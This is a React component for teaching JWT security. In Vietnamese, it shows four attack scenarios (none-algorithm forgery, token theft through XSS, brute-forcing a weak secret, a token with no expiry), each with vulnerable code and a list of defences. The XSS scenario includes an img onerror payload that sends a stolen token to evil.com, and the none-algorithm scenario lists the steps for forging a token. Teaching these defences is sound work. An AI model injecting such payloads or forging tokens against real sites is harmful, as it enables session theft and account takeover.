"use client";

import { useState } from "react";

interface AttackScenario {
  id: string;
  title: string;
  icon: string;
  severity: "critical" | "high" | "medium";
  description: string;
  beforeCode: string;
  afterCode: string;
  howItWorks: string[];
  prevention: string[];
  color: string;
}

const SCENARIOS: AttackScenario[] = [
  {
    id: "none-alg",
    title: "None Algorithm Attack",
    icon: "⚠️",
    severity: "critical",
    description: 'Attacker sửa algorithm trong header thành "none" và bỏ trống signature, khiến server chấp nhận token giả.',
    beforeCode: `// Header bình thường
{
  "alg": "HS256",
  "typ": "JWT"
}
// Token: header.payload.VALID_SIGNATURE`,
    afterCode: `// Header bị tamper
{
  "alg": "none",
  "typ": "JWT"
}
// Token: header.payload.
// (Signature rỗng → bypass verification!)`,
    howItWorks: [
      '1. Attacker decode JWT header (Base64URL)',
      '2. Đổi "alg" từ "HS256" thành "none"',
      '3. Sửa payload (ví dụ: role → Admin)',
      '4. Encode lại và gửi token KHÔNG có signature',
      '5. Server thấy alg=none → không verify → chấp nhận!',
    ],
    prevention: [
      "Luôn enforce algorithm cụ thể: allowedAlgorithms: ['HS256']",
      'REJECT bất kỳ token nào có alg = "none"',
      "Sử dụng thư viện JWT đáng tin cậy (jose, jsonwebtoken)",
      "ValidateIssuerSigningKey = true (ASP.NET Core)",
    ],
    color: "#ef4444",
  },
  {
    id: "xss-theft",
    title: "XSS Token Theft",
    icon: "🔓",
    severity: "critical",
    description: "Attacker inject JavaScript vào trang web để đánh cắp JWT từ localStorage.",
    beforeCode: `// Lưu token vào localStorage (KHÔNG AN TOÀN)
localStorage.setItem('token', jwtToken);

// Gọi API
fetch('/api/products', {
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  }
});`,
    afterCode: `// XSS Attack — Attacker inject script
<img src=x onerror="
  // Đánh cắp token từ localStorage
  const token = localStorage.getItem('token');
  
  // Gửi token về server của attacker
  fetch('https://evil.com/steal?t=' + token);
">

// Attacker giờ có token → full access!`,
    howItWorks: [
      "1. Attacker tìm lỗ hổng XSS (input không sanitize)",
      "2. Inject JavaScript malicious vào trang",
      "3. Script đọc localStorage.getItem('token')",
      "4. Gửi token về server của attacker",
      "5. Attacker dùng token để giả mạo người dùng",
    ],
    prevention: [
      "Lưu token trong httpOnly cookie (JS không đọc được)",
      "Hoặc lưu trong memory (biến JS, không persist)",
      "Sanitize tất cả user input (prevent XSS)",
      "Implement Content Security Policy (CSP)",
      "Short-lived access tokens giảm thiểu damage",
    ],
    color: "#ef4444",
  },
  {
    id: "weak-secret",
    title: "Brute Force Weak Secret",
    icon: "🔑",
    severity: "high",
    description: "Secret key quá yếu → attacker có thể brute force tìm ra key và ký token giả.",
    beforeCode: `// ❌ Secret yếu — DỄ bị brute force
const SECRET = "password123";
const SECRET = "mysecret";
const SECRET = "jwt-secret";
const SECRET = "12345678";

// Tools như hashcat/jwt_tool crack trong vài giây!`,
    afterCode: `// ✅ Secret mạnh — không thể brute force
// Ít nhất 256 bits = 32 bytes ngẫu nhiên
const SECRET = "x9k2fJ$mP@8qL#nR7&wB5yC!vD3hG6t";

// Hoặc generate bằng crypto
const crypto = require('crypto');
const SECRET = crypto.randomBytes(64).toString('hex');
// → "a3f7b2c8d9e0f1...64_hex_chars..."`,
    howItWorks: [
      "1. Attacker có được một JWT token hợp lệ",
      "2. Dùng tool (hashcat, jwt_tool) để brute force secret",
      '3. Thử hàng triệu combinations: "password", "secret123"...',
      "4. Secret yếu → tìm ra trong vài phút/giây",
      "5. Có secret → ký bất kỳ token nào mình muốn",
    ],
    prevention: [
      "Dùng ít nhất 256 bits (32 bytes) random",
      "Generate bằng cryptographic random generator",
      "KHÔNG DÙNG từ điển, tên, ngày sinh",
      "Rotate secret key định kỳ",
      "Xem xét dùng RS256 thay HS256 cho production",
    ],
    color: "#f97316",
  },
  {
    id: "no-expiry",
    title: "Missing Expiration (exp)",
    icon: "⏰",
    severity: "high",
    description: "Token không có exp claim → valid mãi mãi. Nếu bị đánh cắp → attacker có unlimited access.",
    beforeCode: `// ❌ Token không có expiration
{
  "sub": "user123",
  "role": "Admin"
}
// Token này KHÔNG BAO GIỜ hết hạn!
// Nếu bị steal → attacker access forever!`,
    afterCode: `// ✅ Token có expiration hợp lý
{
  "sub": "user123",
  "role": "Admin",
  "iat": 1716239022,
  "exp": 1716240822,  // +30 minutes
  "nbf": 1716239022   // not before
}
// Token hết hạn sau 30 phút
// Dù bị steal → chỉ dùng được 30 phút`,
    howItWorks: [
      "1. Developer quên set exp claim khi tạo token",
      "2. Token được cấp mà không có thời hạn",
      "3. Token bị đánh cắp (qua XSS, sniffing, log leak)",
      "4. Attacker sử dụng token KHÔNG giới hạn thời gian",
      "5. Ngay cả khi user đổi password → token cũ vẫn valid!",
    ],
    prevention: [
      "LUÔN set exp claim (15-60 phút cho access token)",
      "ValidateLifetime = true trong TokenValidationParameters",
      "Kết hợp refresh token (7-30 ngày) để renew",
      "Implement token blacklist cho logout",
      "Monitor abnormal token usage patterns",
    ],
    color: "#f97316",
  },
];

export default function SecurityAttackDemo() {
  const [activeScenario, setActiveScenario] = useState(0);
  const [showAfter, setShowAfter] = useState(false);
  const scenario = SCENARIOS[activeScenario];

  return (
    <div className="space-y-6">
      {/* Scenario selector */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        {SCENARIOS.map((s, i) => (
          <button
            key={s.id}
            onClick={() => { setActiveScenario(i); setShowAfter(false); }}
            className={`p-4 rounded-xl border-2 transition-all text-left ${
              i === activeScenario
                ? `border-red-500/50 bg-red-500/10`
                : "border-slate-700/50 bg-slate-800/30 hover:border-slate-600"
            }`}
          >
            <span className="text-2xl">{s.icon}</span>
            <p className={`text-sm font-semibold mt-2 ${i === activeScenario ? "text-red-400" : "text-slate-300"}`}>
              {s.title}
            </p>
            <span className={`text-xs px-2 py-0.5 rounded-full mt-1 inline-block ${
              s.severity === "critical" ? "bg-red-500/20 text-red-400" : "bg-orange-500/20 text-orange-400"
            }`}>
              {s.severity}
            </span>
          </button>
        ))}
      </div>

      {/* Detail */}
      <div className="byte-card border-l-4" style={{ borderLeftColor: scenario.color }}>
        <div className="flex items-start gap-3 mb-4">
          <span className="text-3xl">{scenario.icon}</span>
          <div>
            <h4 className="text-xl font-bold text-white">{scenario.title}</h4>
            <p className="text-sm text-slate-400 mt-1">{scenario.description}</p>
          </div>
        </div>

        {/* Before / After code */}
        <div className="mb-6">
          <div className="flex gap-2 mb-3">
            <button
              onClick={() => setShowAfter(false)}
              className={`px-4 py-2 rounded-lg text-sm font-semibold transition-colors ${
                !showAfter ? "bg-red-500/20 text-red-400 border border-red-500/30" : "bg-slate-800 text-slate-400"
              }`}
            >
              ❌ Vulnerable Code
            </button>
            <button
              onClick={() => setShowAfter(true)}
              className={`px-4 py-2 rounded-lg text-sm font-semibold transition-colors ${
                showAfter ? "bg-green-500/20 text-green-400 border border-green-500/30" : "bg-slate-800 text-slate-400"
              }`}
            >
              ✅ {scenario.id === "xss-theft" ? "Attack Demo" : "Secure Code"}
            </button>
          </div>
          <div className="p-4 bg-slate-900 rounded-lg overflow-x-auto">
            <pre className="text-sm font-mono">
              <code className={showAfter ? "text-green-300" : "text-red-300"}>
                {showAfter ? scenario.afterCode : scenario.beforeCode}
              </code>
            </pre>
          </div>
        </div>

        {/* How it works */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <h5 className="text-sm font-semibold text-red-400 mb-3">🔍 Cách tấn công hoạt động</h5>
            <div className="space-y-2">
              {scenario.howItWorks.map((step, i) => (
                <div key={i} className="flex gap-2 text-sm text-slate-400">
                  <span className="text-red-400">▸</span>
                  {step}
                </div>
              ))}
            </div>
          </div>
          <div>
            <h5 className="text-sm font-semibold text-green-400 mb-3">🛡️ Cách phòng chống</h5>
            <div className="space-y-2">
              {scenario.prevention.map((p, i) => (
                <div key={i} className="flex gap-2 text-sm text-slate-400">
                  <span className="text-green-400">✓</span>
                  {p}
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
